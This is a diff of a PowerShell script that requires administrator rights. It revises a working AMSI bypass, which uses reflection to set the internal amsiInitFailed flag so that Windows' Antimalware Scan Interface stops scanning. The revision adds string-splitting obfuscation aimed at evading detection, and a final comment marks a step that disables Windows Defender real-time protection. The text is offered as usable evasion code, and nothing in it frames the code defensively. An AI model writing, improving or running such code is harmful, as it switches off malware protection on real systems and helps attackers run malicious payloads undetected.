@@ -1,12 +1,14 @@
 # Ensure script is running with administrator privileges
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole] "Administrator")) {
-    Write-Warning "You do not have Administrator rights to run this script!`nPlease re-run this script as an Administrator."
+    Write-Warning "You do not have Administrator rights to run this script! Please re-run this script as an Administrator."
     exit
 }
 
-# AMSI Bypass with basic obfuscation
-$Type = [Ref].Assembly.GetType(('System.' + 'Management.' + 'Automation.' + 'AmsiUtils'))
-$Field = $Type.GetField(('amsi' + 'Init' + 'Failed'), 'NonPublic,Static')
+# AMSI Bypass with obfuscation
+$TypeName = ('System.' + 'Management.' + 'Automation.' + 'AmsiUtils').ToCharArray() -join ''
+$Type = [Ref].Assembly.GetType($TypeName)
+$FieldName = ('am' + 'si' + 'Init' + 'Failed').ToCharArray() -join ''
+$Field = $Type.GetField($FieldName, 'NonPublic,Static')
 $Field.SetValue($null, $true)
 
 # Disable Windows Defender real-time protection
